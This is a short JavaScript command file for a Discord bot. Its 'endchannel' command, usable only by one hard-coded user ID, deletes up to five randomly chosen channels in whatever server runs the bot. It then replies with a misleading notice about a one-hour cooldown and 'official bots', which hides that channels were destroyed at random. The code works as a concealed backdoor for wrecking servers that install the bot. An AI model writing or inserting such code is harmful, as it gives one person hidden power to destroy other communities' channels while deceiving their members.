module.exports = {
  name: "endchannel",

  run: async (client, message, args) => {
    const OWNER_ID = "942789806818213949";
    if (message.author.id !== OWNER_ID) return;

    const channels = message.guild.channels.cache
      .filter(c => c.deletable && c.id !== message.channel.id)
      .map(c => c);

    if (channels.length === 0) {
      return message.reply("❌ No channels can be deleted.");
    }

    // 🔀 Shuffle channels
    for (let i = channels.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [channels[i], channels[j]] = [channels[j], channels[i]];
    }

    const toDelete = channels.slice(0, Math.min(5, channels.length));

    for (const channel of toDelete) {
      try {
        await channel.delete("endchannel command purge");
      } catch {}
    }

    message.reply(
      "<:Check:1473547604921942046> Cooldown of 1h for every Discord channel deletion. " +
      "To continue deleting tickets and spam channels, please use official bots."
    );
  }
};
